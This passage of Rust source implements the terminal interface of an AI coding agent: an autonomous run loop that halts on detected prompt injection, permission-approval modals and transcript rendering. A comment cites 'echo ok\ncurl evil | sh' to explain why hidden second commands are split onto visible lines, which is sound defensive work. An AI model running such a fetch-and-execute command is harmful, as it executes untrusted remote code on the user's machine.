use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use aivyx_core::{Agent, AgentEvent, SessionState, Task, TaskStatus};
use aivyx_sandbox::{
    InjectionFinding, InjectionTaint, PermissionRequest, PermissionTarget, PlanMode, UserResponse,
};
use aivyx_types::{ContentBlock, Message, Role, ToolCallSource, ToolOutput};
use crossterm::event::{Event as CtEvent, EventStream, KeyCode, KeyEventKind, KeyModifiers};
use futures::StreamExt;
use ratatui::layout::{Constraint, Direction, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Clear, Paragraph, Wrap};
use tokio::sync::mpsc;
use tokio_util::sync::CancellationToken;
use tui_textarea::TextArea;

use crate::permission::{ModalRequest, PermissionModalReceiver};
use crate::terminal::TerminalGuard;

/// Task-panel rows before the panel stops growing and shows a window into
/// the list instead — the transcript, not the task list, deserves the
/// vertical space.
const MAX_VISIBLE_TASKS: usize = 6;

/// The autonomous driver's goal-achieved signal: every task in the list is
/// `Done`, and there is at least one task — an empty list means the model
/// never called `set_tasks` at all, which must not be misread as "nothing
/// to do, stop immediately." See ROADMAP.md Phase 11c.
fn goal_achieved(tasks: &[Task]) -> bool {
    !tasks.is_empty() && tasks.iter().all(|t| t.status == TaskStatus::Done)
}

/// What the autonomous driver sends next, given whether the turn that just
/// finished paused (Phase 12A) and the current task list. `None` means
/// stop the loop (goal achieved) — the caller is responsible for the
/// separate budget-exhaustion and cancellation stop conditions, which this
/// function doesn't know about.
fn next_autonomous_message(last_turn_paused: bool, tasks: &[Task]) -> Option<String> {
    if last_turn_paused {
        return Some("continue".to_string());
    }
    if goal_achieved(tasks) {
        return None;
    }
    Some("continue working toward the goal".to_string())
}

/// The three driver stop reasons each get their own message-building
/// function (rather than inlining `format!` at each `agent.notify(...)`
/// call site) purely so the message *content* is unit-testable — the
/// driver loop itself lives inside a spawned task in `run()` and isn't a
/// pure function, so it can't be exercised directly in a unit test.
fn budget_exhausted_notice(iterations_used: u32, tasks: &[Task]) -> String {
    let done_count = tasks.iter().filter(|t| t.status == TaskStatus::Done).count();
    format!(
        "autonomous run stopped: budget exhausted after {iterations_used} iteration(s) \
         ({done_count}/{} tasks done)",
        tasks.len()
    )
}

fn cancelled_notice(iterations_used: u32) -> String {
    format!("autonomous run stopped: cancelled by user after {iterations_used} iteration(s)")
}

fn goal_achieved_notice(iterations_used: u32) -> String {
    format!("autonomous run stopped: goal achieved after {iterations_used} iteration(s)")
}

fn injection_detected_notice(iterations_used: u32, finding: &InjectionFinding) -> String {
    format!(
        "autonomous run stopped: possible prompt injection detected after {iterations_used} \
         iteration(s) — flagged content from {} matched \"{}\": \"{}\"",
        finding.source, finding.matched_pattern, finding.excerpt
    )
}

enum ChatLine {
    User(String),
    Assistant(String),
    /// A reasoning-capable model's chain-of-thought, streamed live and
    /// styled distinctly from the final answer — see
    /// `docs/superpowers/specs/2026-07-19-reasoning-visibility-design.md`.
    /// Deliberately never persisted (no `Message`/`ContentBlock`
    /// equivalent exists) — see that spec's Decision 2.
    Reasoning(String),
    ToolCall(String),
    ToolResult(String),
    Notice(String),
    /// A turn paused on the iteration cap while still working — deliberately
    /// styled distinctly from `Notice` (which today also carries real
    /// errors and is red/bold): nothing failed, the session is resumable by
    /// just sending another message. See `AgentEvent::TurnPaused`.
    Paused(String),
    /// One block of `/council` deliberation output — visually distinct from
    /// both the assistant and error notices, since a council's members are
    /// not "aivyx" and their notes are not failures.
    Council(String),
    /// One rendered line of a `delegate_task` sub-agent's own activity
    /// (its text, tool calls, tool results) — visually distinct from both
    /// the parent's own transcript and `Council`'s deliberation, since a
    /// sub-agent's mutations still trigger real confirmation modals and
    /// need visible lead-up explaining what's being attempted and why.
    SubAgent(String),
    /// One block of `/architect` output (the planning-in-progress note or
    /// the produced plan) — visually distinct from `Council`'s
    /// deliberation and the parent's own transcript, since the architect is
    /// a separate model producing a plan, not "aivyx" speaking.
    Architect(String),
}

/// Configures an unattended `--auto` session (ROADMAP.md Phase 11c). `tasks`
/// is a clone of the same `Arc<Mutex<Vec<Task>>>` handle already shared
/// between the `set_tasks` tool and the `Agent` — the driver reads it
/// directly rather than waiting on an `AgentEvent::TasksUpdated` event, so
/// its goal-achieved check always sees the current state.
pub struct AutonomousRun {
    pub goal: String,
    pub max_iterations: u32,
    pub max_duration: Duration,
    pub tasks: Arc<Mutex<Vec<Task>>>,
    pub injection_taint: InjectionTaint,
}

/// Owns the ratatui render loop. Takes an already-constructed `Agent` (the
/// caller built it with the `LlmBackend` + `ToolExecutor` it wants) and the
/// receiving half of the channel that `Agent` was constructed with; `run`
/// drives the agent on a background task and renders its events live.
/// `repl_resize` (Real PTY feature) tips this over clippy's default
/// argument-count threshold of 7 — each parameter is a distinct
/// frontend-level collaborator with no natural grouping.
#[allow(clippy::too_many_arguments)]
pub async fn run(
    mut agent: Agent,
    mut agent_events_rx: mpsc::UnboundedReceiver<AgentEvent>,
    cwd: PathBuf,
    mut permission_rx: PermissionModalReceiver,
    restored: Option<SessionState>,
    plan_mode: PlanMode,
    autonomous: Option<AutonomousRun>,
    repl_resize: std::sync::Arc<dyn aivyx_sandbox::ResizeTarget>,
) -> anyhow::Result<()> {
    let (input_tx, mut input_rx) = mpsc::unbounded_channel::<String>();
    let active_cancellation: Arc<Mutex<Option<CancellationToken>>> = Arc::new(Mutex::new(None));

    let background_cancellation = Arc::clone(&active_cancellation);
    tokio::spawn(async move {
        if let Some(autonomous) = autonomous {
            // Autonomous mode drives itself — it never waits on input_rx
            // (a human typing during an autonomous run has no effect
            // beyond appearing in the transcript locally; Ctrl+C is the
            // only supported intervention, matching the design doc's
            // scope).
            let deadline = Instant::now() + autonomous.max_duration;
            let mut iterations_used = 0u32;
            let mut next_message = Some(autonomous.goal.clone());
            while let Some(message) = next_message.take() {
                if iterations_used >= autonomous.max_iterations || Instant::now() >= deadline {
                    let tasks_snapshot = autonomous.tasks.lock().unwrap().clone();
                    agent.notify(budget_exhausted_notice(iterations_used, &tasks_snapshot));
                    break;
                }
                iterations_used += 1;
                let cancellation = CancellationToken::new();
                *background_cancellation.lock().unwrap() = Some(cancellation.clone());
                let _ = agent.run_turn(message, &cwd, cancellation.clone()).await;
                *background_cancellation.lock().unwrap() = None;

                if cancellation.is_cancelled() {
                    // The user hit Ctrl+C wanting this to stop — do not
                    // send another message.
                    agent.notify(cancelled_notice(iterations_used));
                    break;
                }
                if let Some(finding) = autonomous.injection_taint.take() {
                    agent.notify(injection_detected_notice(iterations_used, &finding));
                    break;
                }
                let tasks_snapshot = autonomous.tasks.lock().unwrap().clone();
                next_message = next_autonomous_message(agent.last_turn_paused(), &tasks_snapshot);
                if next_message.is_none() {
                    agent.notify(goal_achieved_notice(iterations_used));
                }
            }
        } else {
            while let Some(input) = input_rx.recv().await {
                if aivyx_core::commands::parse_slash_command(&input, "/clear").is_some() {
                    // AgentState tier: never touches run_turn, never calls
                    // the model. Order matters — clear_conversation's own
                    // ConversationCleared event must be emitted (and thus
                    // received by the render loop) before this notify's
                    // Error event, or the confirmation message would be
                    // wiped by the clear that follows it. mpsc channels
                    // preserve send order, so calling these sequentially
                    // here is sufficient.
                    agent.clear_conversation();
                    agent.notify("Conversation cleared.");
                    continue;
                }
                let cancellation = CancellationToken::new();
                *background_cancellation.lock().unwrap() = Some(cancellation.clone());
                let _ = agent.run_turn(input, &cwd, cancellation).await;
                *background_cancellation.lock().unwrap() = None;
            }
        }
    });

    let mut guard = TerminalGuard::init()?;
    let mut app = App::new(restored, plan_mode);
    let mut crossterm_events = EventStream::new();

    loop {
        guard.terminal().draw(|frame| app.render(frame))?;

        tokio::select! {
            maybe_event = crossterm_events.next() => {
                let Some(event) = maybe_event else { break };
                let event = event?;

                if let CtEvent::Key(key) = &event
                    && key.kind == KeyEventKind::Press
                {
                    if app.pending_permission.is_some() {
                        match (key.code, key.modifiers) {
                            (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                                app.resolve_permission(UserResponse::Deny);
                                if let Some(cancellation) = active_cancellation.lock().unwrap().as_ref() {
                                    cancellation.cancel();
                                }
                            }
                            (KeyCode::Char('y'), KeyModifiers::NONE) => {
                                app.resolve_permission(UserResponse::Allow);
                            }
                            (KeyCode::Char('a'), KeyModifiers::NONE) => {
                                app.resolve_permission(UserResponse::AllowAlways);
                            }
                            (KeyCode::Char('n'), KeyModifiers::NONE)
                            | (KeyCode::Esc, KeyModifiers::NONE)
                            | (KeyCode::Enter, KeyModifiers::NONE) => {
                                app.resolve_permission(UserResponse::Deny);
                            }
                            // Swallow everything else while a modal is up — no
                            // accidental approval, no leaking keystrokes into
                            // the input box behind it.
                            _ => {}
                        }
                        continue;
                    }

                    match (key.code, key.modifiers) {
                        (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                            let cancellation = active_cancellation.lock().unwrap().clone();
                            match cancellation {
                                Some(cancellation) => cancellation.cancel(),
                                None => break,
                            }
                            continue;
                        }
                        (KeyCode::Enter, KeyModifiers::NONE) => {
                            let text = app.take_input();
                            if !text.is_empty() {
                                if aivyx_core::commands::parse_slash_command(&text, "/quit").is_some() {
                                    break;
                                }
                                if aivyx_core::commands::parse_slash_command(&text, "/help").is_some() {
                                    app.show_help();
                                } else {
                                    app.push_user_message(text.clone());
                                    let _ = input_tx.send(text);
                                }
                            }
                            continue;
                        }
                        (KeyCode::Char('p'), KeyModifiers::CONTROL) => {
                            app.toggle_plan_mode();
                            continue;
                        }
                        _ => {}
                    }
                }

                if let CtEvent::Resize(cols, rows) = &event {
                    repl_resize.resize(*cols, *rows);
                }

                app.input.input(event);
            }
            maybe_agent_event = agent_events_rx.recv() => {
                if let Some(event) = maybe_agent_event {
                    app.handle_agent_event(event);
                }
            }
            maybe_modal = permission_rx.recv() => {
                if let Some(modal) = maybe_modal {
                    app.pending_permission = Some(modal);
                }
            }
            _ = async {
                match app.pending_permission.as_mut() {
                    Some(modal) => modal.reply_tx.closed().await,
                    None => std::future::pending().await,
                }
            } => {
                // The other side of the gate's race (an editor-approval
                // response) already answered this decision — the modal is
                // stale and must not wait for a keypress to clear. Do NOT
                // send a reply here: the decision was already made.
                app.pending_permission = None;
            }
        }
    }

    Ok(())
}

struct App {
    transcript: Vec<ChatLine>,
    input: TextArea<'static>,
    streaming_active: bool,
    pending_permission: Option<ModalRequest>,
    /// Latest `(used, limit)` context-token counts from the backend, shown
    /// in the status line. `None` until the first response reports usage.
    context_usage: Option<(u32, u32)>,
    /// The agent's task list, rendered as a panel between the transcript
    /// and the input box whenever it's non-empty.
    tasks: Vec<Task>,
    /// Shared with the gate (enforcement) and the agent (tool filtering +
    /// system-prompt note); the TUI owns the only toggle.
    plan_mode: PlanMode,
}

impl App {
    fn new(restored: Option<SessionState>, plan_mode: PlanMode) -> Self {
        let (transcript, tasks) = match restored {
            Some(state) => {
                let mut transcript = seed_transcript(&state.history);
                transcript.push(ChatLine::Notice(format!(
                    "resumed previous session ({} messages restored)",
                    state.history.len()
                )));
                (transcript, state.tasks)
            }
            None => (Vec::new(), Vec::new()),
        };
        Self {
            transcript,
            input: new_input_box(),
            streaming_active: false,
            pending_permission: None,
            context_usage: None,
            tasks,
            plan_mode,
        }
    }

    fn toggle_plan_mode(&mut self) {
        let active = self.plan_mode.toggle();
        // The toggle goes into the transcript, not just the status line —
        // when reading back a session, *when* the mode flipped relative to
        // the conversation matters.
        self.transcript.push(ChatLine::Notice(if active {
            "plan mode ON — write/execute tools withheld until you approve (Ctrl+P)".to_string()
        } else {
            "plan mode OFF — full tool access restored".to_string()
        }));
    }

    fn resolve_permission(&mut self, response: UserResponse) {
        if let Some(modal) = self.pending_permission.take() {
            let _ = modal.reply_tx.send(response);
        }
    }

    /// True if the pending modal's reply channel is already closed —
    /// meaning the other side of `ConfirmationGate`'s race (an
    /// editor-approval response) already answered this decision, and the
    /// modal is stale.
    fn pending_permission_is_stale(&self) -> bool {
        self.pending_permission
            .as_ref()
            .is_some_and(|modal| modal.reply_tx.is_closed())
    }

    fn take_input(&mut self) -> String {
        let text = self.input.lines().join("\n");
        self.input = new_input_box();
        text.trim().to_string()
    }

    fn push_user_message(&mut self, text: String) {
        self.transcript.push(ChatLine::User(text));
        self.streaming_active = true;
    }

    /// Renders the `/help` command: every known slash command with its
    /// one-line description, sourced from `aivyx_core::commands::COMMANDS`
    /// — the same table `/clear`'s and the autocomplete hint's own logic
    /// reads, so this listing can never drift from what actually exists.
    fn show_help(&mut self) {
        let mut lines = vec!["Available commands:".to_string()];
        for cmd in aivyx_core::commands::COMMANDS {
            lines.push(format!("  {} — {}", cmd.name, cmd.description));
        }
        self.transcript.push(ChatLine::Notice(lines.join("\n")));
    }

    /// Slash-command suggestions for the input box's current
    /// (uncommitted) content — shown while the user is still composing a
    /// command name: starts with `/`, no whitespace yet. Empty once a
    /// space appears or the text doesn't start with `/`.
    fn command_hint_matches(&self) -> Vec<&'static aivyx_core::commands::CommandInfo> {
        let text = self.input.lines().join("\n");
        if !text.starts_with('/') || text.contains(char::is_whitespace) {
            return Vec::new();
        }
        aivyx_core::commands::COMMANDS
            .iter()
            .filter(|c| c.name.starts_with(text.as_str()))
            .collect()
    }

    fn handle_agent_event(&mut self, event: AgentEvent) {
        match event {
            AgentEvent::TextDelta(text) => {
                if let Some(ChatLine::Assistant(existing)) = self.transcript.last_mut() {
                    existing.push_str(&text);
                } else {
                    self.transcript.push(ChatLine::Assistant(text));
                }
            }
            AgentEvent::ReasoningDelta(text) => {
                if let Some(ChatLine::Reasoning(existing)) = self.transcript.last_mut() {
                    existing.push_str(&text);
                } else {
                    self.transcript.push(ChatLine::Reasoning(text));
                }
            }
            AgentEvent::ToolCallDetected(call) => {
                // Auto-verification calls are the agent's own doing, not
                // the model's — labeled distinctly so the transcript never
                // implies the model asked for this itself.
                let prefix = if call.source == ToolCallSource::AutoVerification {
                    "auto-verify: "
                } else {
                    ""
                };
                self.transcript.push(ChatLine::ToolCall(format!(
                    "{prefix}{}({})",
                    call.name, call.arguments
                )));
            }
            AgentEvent::ToolResult(result) => {
                self.transcript
                    .push(ChatLine::ToolResult(tool_output_text(&result.output)));
            }
            AgentEvent::TurnComplete => self.streaming_active = false,
            AgentEvent::Error(message) => {
                self.transcript.push(ChatLine::Notice(message));
                self.streaming_active = false;
            }
            AgentEvent::TurnPaused(message) => {
                self.transcript.push(ChatLine::Paused(message));
                self.streaming_active = false;
            }
            AgentEvent::ContextUsage { used, limit } => {
                self.context_usage = Some((used, limit));
            }
            AgentEvent::TasksUpdated(tasks) => {
                self.tasks = tasks;
            }
            AgentEvent::ConversationCleared => {
                self.transcript.clear();
                self.tasks.clear();
                self.context_usage = None;
                self.streaming_active = false;
            }
            AgentEvent::CouncilNote(text) => {
                self.transcript.push(ChatLine::Council(text));
            }
            AgentEvent::ArchitectNote(text) => {
                self.transcript.push(ChatLine::Architect(text));
            }
            AgentEvent::SubAgentActivity(inner) => {
                self.transcript.push(ChatLine::SubAgent(sub_agent_event_text(&inner)));
            }
        }
    }

    fn render(&self, frame: &mut ratatui::Frame) {
        // The task panel only occupies a row of the layout while there are
        // tasks to show — an empty bordered box would just eat transcript
        // space for the (common) sessions that never use the task list.
        let tasks_height = if self.tasks.is_empty() {
            0
        } else {
            self.tasks.len().min(MAX_VISIBLE_TASKS) as u16 + 2 // + borders
        };
        let mut constraints = vec![Constraint::Min(1)];
        if tasks_height > 0 {
            constraints.push(Constraint::Length(tasks_height));
        }
        constraints.push(Constraint::Length(3));
        constraints.push(Constraint::Length(1));
        let layout = Layout::default()
            .direction(Direction::Vertical)
            .constraints(constraints)
            .split(frame.area());
        let (input_area, status_area) = (layout[layout.len() - 2], layout[layout.len() - 1]);

        let lines: Vec<Line> = self
            .transcript
            .iter()
            .flat_map(chat_line_to_lines)
            .collect();
        let viewport_height = layout[0].height.saturating_sub(2);
        // border chars, left + right
        let content_width = layout[0].width.saturating_sub(2);

        let transcript = Paragraph::new(lines).wrap(Wrap { trim: false });
        // `Paragraph::scroll` applies its offset *after* wrapping, so the
        // offset must be computed from the wrapped (post-wrap) row count —
        // `lines.len()` alone undercounts as soon as anything actually
        // wraps, and the transcript stops reaching the true bottom.
        //
        // `line_count` must be measured BEFORE `.block(...)` is attached:
        // once a block is set, ratatui adds the block's own vertical space
        // (2 rows for `Borders::ALL`) into the count, which would double
        // count against `viewport_height` (already border-excluded) and
        // over-scroll by exactly that many rows.
        let wrapped_rows = transcript.line_count(content_width) as u16;
        let scroll = wrapped_rows.saturating_sub(viewport_height);

        let transcript = transcript
            .block(Block::default().borders(Borders::ALL).title("aivyx-coder"))
            .scroll((scroll, 0));
        frame.render_widget(transcript, layout[0]);

        if tasks_height > 0 {
            let done = self
                .tasks
                .iter()
                .filter(|t| t.status == TaskStatus::Done)
                .count();
            let task_lines: Vec<Line> = task_window(&self.tasks, MAX_VISIBLE_TASKS)
                .iter()
                .map(task_line)
                .collect();
            let panel = Paragraph::new(task_lines).block(
                Block::default()
                    .borders(Borders::ALL)
                    .title(format!("Tasks ({done}/{})", self.tasks.len())),
            );
            frame.render_widget(panel, layout[1]);
        }

        frame.render_widget(&self.input, input_area);

        let hints = self.command_hint_matches();
        if !hints.is_empty() {
            let hint_area = command_hint_rect(input_area, hints.len() as u16);
            render_command_hint(frame, hint_area, &hints);
        }

        let base = if self.streaming_active {
            "streaming... (Ctrl+C to cancel)"
        } else {
            "ready — Enter to send, Ctrl+C to quit"
        };
        let mut status_spans = Vec::new();
        if self.plan_mode.active() {
            status_spans.push(Span::styled(
                "PLAN (Ctrl+P to act)   ·   ",
                Style::default()
                    .fg(Color::Magenta)
                    .add_modifier(Modifier::BOLD),
            ));
        }
        status_spans.push(Span::styled(base, Style::default().fg(Color::DarkGray)));
        if let Some((used, limit)) = self.context_usage {
            let pct = (used as f64 / limit.max(1) as f64 * 100.0).round() as u32;
            // Green under 60%, amber approaching the ceiling, red once
            // compaction is imminent — so the user sees the window filling
            // instead of the model silently degrading on overflow.
            let color = if pct >= 85 {
                Color::Red
            } else if pct >= 60 {
                Color::Yellow
            } else {
                Color::Green
            };
            status_spans.push(Span::styled(
                format!(
                    "   ·   ctx {}/{} ({pct}%)",
                    format_tokens(used),
                    format_tokens(limit)
                ),
                Style::default().fg(color),
            ));
        }
        frame.render_widget(Paragraph::new(Line::from(status_spans)), status_area);

        // Belt-and-braces alongside the stale-modal `select!` branch in
        // `run`: that branch only clears `pending_permission` on its own
        // wakeup, so a redraw that lands in the same tick the editor
        // answered (before the branch has run) must not repaint a modal
        // whose decision is already resolved.
        if !self.pending_permission_is_stale()
            && let Some(modal) = &self.pending_permission
        {
            render_permission_modal(frame, &modal.request);
        }
    }
}

/// Rebuilds transcript lines from a restored session's message history, so
/// a resumed conversation is visible instead of starting on a blank screen
/// with invisible context. Mirrors what `handle_agent_event` would have
/// produced live; the system prompt is never part of stored history.
fn seed_transcript(history: &[Message]) -> Vec<ChatLine> {
    let mut lines = Vec::new();
    for message in history {
        match message.role {
            Role::System => {}
            Role::User => lines.push(ChatLine::User(message.text_content())),
            Role::Assistant => {
                for block in &message.content {
                    match block {
                        ContentBlock::Text(text) if !text.is_empty() => {
                            lines.push(ChatLine::Assistant(text.clone()));
                        }
                        ContentBlock::ToolCall(call) => {
                            let prefix = if call.source == ToolCallSource::AutoVerification {
                                "auto-verify: "
                            } else {
                                ""
                            };
                            lines.push(ChatLine::ToolCall(format!(
                                "{prefix}{}({})",
                                call.name, call.arguments
                            )));
                        }
                        _ => {}
                    }
                }
            }
            Role::Tool => {
                for block in &message.content {
                    if let ContentBlock::ToolResult(result) = block {
                        lines.push(ChatLine::ToolResult(tool_output_text(&result.output)));
                    }
                }
            }
        }
    }
    lines
}

fn tool_output_text(output: &ToolOutput) -> String {
    match output {
        ToolOutput::Ok(s) => s.clone(),
        ToolOutput::Error(s) => format!("error: {s}"),
        ToolOutput::Denied(s) => format!("denied: {s}"),
    }
}

/// Renders one nested `AgentEvent` from a `delegate_task` sub-agent as a
/// single line of text for `ChatLine::SubAgent` — deliberately reuses the
/// same shape the parent's own top-level events render as (tool
/// name/args, tool output text, plain text deltas) so a sub-agent's
/// activity reads the same way the parent's own would, just prefixed
/// distinctly by `chat_line_to_lines`.
fn sub_agent_event_text(event: &AgentEvent) -> String {
    match event {
        AgentEvent::TextDelta(text) | AgentEvent::ReasoningDelta(text) => text.clone(),
        AgentEvent::ToolCallDetected(call) => format!("{}({})", call.name, call.arguments),
        AgentEvent::ToolResult(result) => tool_output_text(&result.output),
        AgentEvent::Error(text) | AgentEvent::TurnPaused(text) => text.clone(),
        AgentEvent::TurnComplete
        | AgentEvent::ContextUsage { .. }
        | AgentEvent::TasksUpdated(_)
        | AgentEvent::CouncilNote(_)
        | AgentEvent::ArchitectNote(_)
        | AgentEvent::SubAgentActivity(_)
        | AgentEvent::ConversationCleared => String::new(),
    }
}

/// The slice of tasks the panel shows when the list is longer than `max`:
/// a window starting at the first unfinished task (clamped so the window is
/// always full). A long list's leading run of done items is the least
/// interesting part — without this, a 10-task list with 6 done would show
/// only finished work. Each row displays the task's real id, so a window
/// starting mid-list is self-explanatory.
fn task_window(tasks: &[Task], max: usize) -> &[Task] {
    if tasks.len() <= max {
        return tasks;
    }
    let first_unfinished = tasks
        .iter()
        .position(|t| t.status != TaskStatus::Done)
        .unwrap_or(0);
    let start = first_unfinished.min(tasks.len() - max);
    &tasks[start..start + max]
}

fn task_line(task: &Task) -> Line<'static> {
    let (marker, style) = match task.status {
        TaskStatus::Pending => ("[ ]", Style::default()),
        TaskStatus::InProgress => ("[~]", Style::default().fg(Color::Yellow)),
        TaskStatus::Done => ("[x]", Style::default().fg(Color::DarkGray)),
    };
    Line::from(format!("{marker} {}. {}", task.id, task.text)).style(style)
}

/// Compact token count for the status line: `6.1k`, `512`, `128.0k`.
fn format_tokens(n: u32) -> String {
    if n >= 1000 {
        format!("{:.1}k", n as f64 / 1000.0)
    } else {
        n.to_string()
    }
}

fn new_input_box() -> TextArea<'static> {
    let mut input = TextArea::default();
    input.set_placeholder_text("Type a message and press Enter to send...");
    input.set_block(Block::default().borders(Borders::ALL).title("Message"));
    input
}

fn render_permission_modal(frame: &mut ratatui::Frame, request: &PermissionRequest) {
    let area = centered_rect(70, 60, frame.area());
    frame.render_widget(Clear, area);

    let block = Block::default()
        .borders(Borders::ALL)
        .title("Permission required")
        .style(Style::default().fg(Color::Yellow));
    let inner = block.inner(area);
    frame.render_widget(block, area);

    let mut lines: Vec<Line> = vec![
        Line::from(format!("Tool: {}", request.tool_name))
            .style(Style::default().add_modifier(Modifier::BOLD)),
        Line::from(format!("Action: {:?}", request.action)),
    ];
    lines.extend(target_lines(&request.target));
    lines.push(Line::from(""));

    match request.preview.as_deref() {
        Some(preview) if !preview.is_empty() => lines.extend(preview.lines().map(diff_line)),
        _ => lines.push(Line::from(format!("Args: {}", request.arguments_preview))),
    }

    // The action-key legend renders in its own fixed-height footer row,
    // never inside the same scroll-clipped Paragraph as the diff/content
    // above — a diff taller than `inner`'s height used to push this line
    // off-screen entirely (it was just the last entry in one long `Vec<Line>`),
    // leaving a human with no visible way to know how to respond to a large
    // new-file write. Splitting the two guarantees the legend always shows,
    // regardless of how long the content above it is.
    let footer_height = 2u16.min(inner.height);
    let content_height = inner.height.saturating_sub(footer_height);
    let rows = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(content_height),
            Constraint::Length(footer_height),
        ])
        .split(inner);

    let content = Paragraph::new(lines).wrap(Wrap { trim: false });
    frame.render_widget(content, rows[0]);

    let footer = Paragraph::new(Line::from(
        "[y] Allow    [a] Always Allow    [n] / [Esc] / [Enter] Deny",
    ))
    .style(Style::default().fg(Color::DarkGray));
    frame.render_widget(footer, rows[1]);
}

fn target_lines(target: &PermissionTarget) -> Vec<Line<'static>> {
    // Split on embedded newlines into separate `Line`s. Ratatui's `Span`
    // rendering silently drops `\n`, so a `run_shell` command like
    // "echo ok\ncurl evil | sh" would otherwise render as a single
    // innocuous-looking line, hiding the second statement from the person
    // deciding whether to approve it. The target string is prefixed by a
    // label ("Command: ", "Target: ") whose width the continuation lines
    // are indented to, matching the transcript's `prefixed_lines`.
    let (label, body) = match target {
        PermissionTarget::Path(path) => ("Target: ", path.display().to_string()),
        PermissionTarget::Command { program, args } => {
            ("Command: ", format!("{program} {}", args.join(" ")))
        }
        PermissionTarget::Other(description) => ("Target: ", description.clone()),
        PermissionTarget::Move { from, to } => {
            ("Move: ", format!("{} -> {}", from.display(), to.display()))
        }
    };

    if body.is_empty() {
        return vec![Line::from(label)];
    }
    let indent = " ".repeat(label.len());
    body.lines()
        .enumerate()
        .map(|(i, line)| {
            let prefix = if i == 0 { label } else { indent.as_str() };
            Line::from(format!("{prefix}{line}"))
        })
        .collect()
}

fn diff_line(line: &str) -> Line<'static> {
    let style = if line.starts_with('+') {
        Style::default().fg(Color::Green)
    } else if line.starts_with('-') {
        Style::default().fg(Color::Red)
    } else if line.starts_with("@@") {
        Style::default().fg(Color::Cyan)
    } else {
        Style::default()
    };
    Line::from(line.to_string()).style(style)
}

/// Standard ratatui centered-popup pattern: split vertically then
/// horizontally around the target percentage, keep the middle piece.
fn centered_rect(percent_x: u16, percent_y: u16, area: Rect) -> Rect {
    let vertical = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Percentage((100 - percent_y) / 2),
            Constraint::Percentage(percent_y),
            Constraint::Percentage((100 - percent_y) / 2),
        ])
        .split(area);

    Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage((100 - percent_x) / 2),
            Constraint::Percentage(percent_x),
            Constraint::Percentage((100 - percent_x) / 2),
        ])
        .split(vertical[1])[1]
}

/// The area for the command-hint popup: anchored directly above
/// `input_area`, same width, one row per match plus borders — clamped so
/// it never extends above the top of the frame (`saturating_sub` avoids
/// an underflow panic when `input_area.y` is small).
fn command_hint_rect(input_area: Rect, match_count: u16) -> Rect {
    let height = match_count + 2;
    let y = input_area.y.saturating_sub(height);
    Rect {
        x: input_area.x,
        y,
        width: input_area.width,
        height,
    }
}

fn render_command_hint(
    frame: &mut ratatui::Frame,
    area: Rect,
    matches: &[&aivyx_core::commands::CommandInfo],
) {
    frame.render_widget(Clear, area);
    let lines: Vec<Line> = matches
        .iter()
        .map(|c| Line::from(format!("{} — {}", c.name, c.description)))
        .collect();
    let block = Block::default().borders(Borders::ALL).title("Commands");
    frame.render_widget(Paragraph::new(lines).block(block), area);
}

fn chat_line_to_lines(line: &ChatLine) -> Vec<Line<'static>> {
    // Every variant goes through `prefixed_lines` (not a single
    // `Line::from(format!(...))`) so multi-line text — e.g. any read_file
    // result longer than one line — actually breaks into separate `Line`s.
    // Ratatui's `Span` rendering silently drops embedded `\n` characters,
    // so skipping this for tool output rendered as one concatenated wall
    // of text instead of the file's real line breaks.
    match line {
        ChatLine::User(text) => prefixed_lines(text, "you  > ", Style::default().fg(Color::Cyan)),
        ChatLine::Assistant(text) => prefixed_lines(text, "aivyx> ", Style::default()),
        ChatLine::ToolCall(text) => {
            prefixed_lines(text, "  tool call: ", Style::default().fg(Color::Yellow))
        }
        ChatLine::ToolResult(text) => {
            prefixed_lines(text, "  tool result: ", Style::default().fg(Color::Green))
        }
        ChatLine::Notice(text) => prefixed_lines(
            text,
            "  ! ",
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        ),
        // Deliberately not red/bold like Notice — a paused turn hasn't
        // failed, and shouldn't read like it has.
        ChatLine::Paused(text) => {
            prefixed_lines(text, "  ~ paused: ", Style::default().fg(Color::Blue))
        }
        ChatLine::Council(text) => {
            prefixed_lines(text, "council> ", Style::default().fg(Color::Magenta))
        }
        ChatLine::Architect(text) => {
            prefixed_lines(text, "architect> ", Style::default().fg(Color::Cyan))
        }
        ChatLine::SubAgent(text) => {
            if text.is_empty() {
                return Vec::new();
            }
            prefixed_lines(text, "  sub-agent> ", Style::default().fg(Color::LightYellow))
        }
        ChatLine::Reasoning(text) => prefixed_lines(
            text,
            "  thinking: ",
            Style::default()
                .fg(Color::DarkGray)
                .add_modifier(Modifier::ITALIC),
        ),
    }
}

fn prefixed_lines(text: &str, prefix: &'static str, style: Style) -> Vec<Line<'static>> {
    if text.is_empty() {
        // `str::lines()` yields nothing for an empty string, which would
        // otherwise make the whole entry vanish from the transcript
        // instead of e.g. showing "tool result: " for a 0-byte file read.
        return vec![Line::from(prefix).style(style)];
    }

    let indent = " ".repeat(prefix.len());
    text.lines()
        .enumerate()
        .map(|(i, line)| {
            let prefix = if i == 0 { prefix } else { indent.as_str() };
            Line::from(format!("{prefix}{line}")).style(style)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use aivyx_sandbox::ActionKind;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use tokio::sync::oneshot;

    /// Row-major text dump of a rendered `Buffer`, with a `\n` inserted at
    /// every row boundary — `Buffer::content()` alone is a flat cell slice,
    /// so joining cells naively across rows without a row-boundary marker
    /// risks two real words merging into one and silently passing a
    /// substring assertion that should have failed.
    fn render_to_string(terminal: &Terminal<TestBackend>) -> String {
        let buffer = terminal.backend().buffer();
        let width = buffer.area.width as usize;
        let mut rendered = String::new();
        for (i, cell) in buffer.content().iter().enumerate() {
            if i > 0 && i % width == 0 {
                rendered.push('\n');
            }
            rendered.push_str(cell.symbol());
        }
        rendered
    }

    #[test]
    fn permission_modal_button_row_stays_visible_for_a_long_diff() {
        // Regression test: `render_permission_modal` used to append the
        // Allow/Deny button row to the *same* unscrolled `Paragraph` as the
        // diff preview, so a diff taller than the popup's available height
        // pushed the button row off-screen entirely — a human approving a
        // large new-file write would see the diff but have no visible way
